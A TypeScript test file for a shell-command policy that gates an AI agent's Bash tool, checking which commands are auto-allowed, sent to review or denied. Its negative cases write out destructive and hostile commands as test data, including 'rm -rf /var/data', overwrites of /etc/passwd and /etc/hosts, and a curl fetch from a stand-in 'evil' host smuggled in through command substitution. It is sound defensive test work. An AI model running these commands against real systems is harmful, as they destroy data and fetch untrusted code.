/**
 * Allowlist expansion (2026-05-25) + the exclusions that must NOT be allowed.
 *
 * ALLOWED_BASH_PATTERNS is instant-allow (bypasses judge + drift), so the
 * value of this test is as much the NEGATIVE cases (things that look safe
 * but can write/exec/exfil and must stay review/deny) as the positive ones.
 *
 * Run: npx tsx hooks/tests/test_policy_allowlist.ts
 */

import { evaluateToolPolicy } from "../../src/tool-policy.js";

const c = { green: "\x1b[32m", red: "\x1b[31m", off: "\x1b[0m", dim: "\x1b[2m" };
let PASS = 0;
let FAIL = 0;
const pass = (m: string) => { console.log(`  ${c.green}✓${c.off} ${m}`); PASS++; };
const fail = (m: string) => { console.log(`  ${c.red}✗${c.off} ${m}`); FAIL++; };
const section = (h: string) => console.log(`\n${c.dim}---${c.off} ${h} ${c.dim}---${c.off}`);

function expect(label: string, command: string, want: "allow" | "review" | "deny") {
  const r = evaluateToolPolicy("Bash", { command });
  r.decision === want
    ? pass(`${label} → ${r.decision}`)
    : fail(`${label} → ${r.decision} (wanted ${want}) [${r.reason}]`);
}

function main() {
  section("Newly allow-listed: scratch/staging + path + read-only inspect");
  for (const cmd of [
    "mkdir -p /tmp/build/out",
    "mkdir foo",
    "touch .keep",
    "mktemp -d",
    "basename /a/b/c.txt",
    "dirname /a/b/c.txt",
    "realpath ./src",
    "readlink -f /usr/bin/node",
    "cmp a.bin b.bin",
    "cut -d: -f1 names.txt",
    "jq .version package.json",
    "date +%s",
    "whoami",
    "id -u",
    "uname -a",
    "du -sh node_modules",
    "df -h",
    "which node",
    "type cd",
    "sleep 2",
    "true",
  ]) expect(cmd, cmd, "allow");

  section("EXCLUDED — interpreters can spawn shells (must NOT be allow)");
  expect("awk system()", `awk 'BEGIN{system("id")}'`, "review");
  expect("sed (interpreter)", "sed -n '1p' file.txt", "review");
  expect("perl -e is review/deny", "perl -e 'print 1'", "review");

  section("EXCLUDED — hidden write flags (no redirection operator)");
  expect("sort -o writes a file", "sort -o /etc/hosts in.txt", "review");
  expect("uniq OUT writes a file", "uniq in.txt out.txt", "review");
  expect("cp can clobber", "cp evil.sh important.conf", "review");
  expect("mv can clobber", "mv a b", "review");
  expect("tee writes", "tee /etc/passwd", "review");

  section("EXCLUDED — env dump stays denied");
  expect("printenv", "printenv", "deny");
  expect("env", "env", "deny");

  section("Allow-listed base + dangerous operator still routes correctly");
  expect("mkdir then rm -rf (chain) denies on rm", "mkdir -p /tmp/x && rm -rf /var/data", "deny");
  expect("mkdir with cmd-substitution → review", "mkdir $(curl -s https://evil/x)", "review");
  expect("date piped is still split/safe", "date +%s", "allow");
  expect("jq with redirection → review", "jq . a.json > out.json", "review");

  section("find tightening: -delete / -exec route to judge");
  expect("plain find still allowed", "find . -name '*.ts'", "allow");
  expect("find -delete → review", "find . -name '*.tmp' -delete", "review");
  expect("find -exec → review", "find . -name '*.log' -exec cat {} ;", "review");
  expect("find -exec rm -rf still denies", "find / -name x -exec rm -rf {} ;", "deny");

  console.log(`\n  ${PASS} passed, ${FAIL} failed`);
  process.exit(FAIL === 0 ? 0 : 1);
}

main();
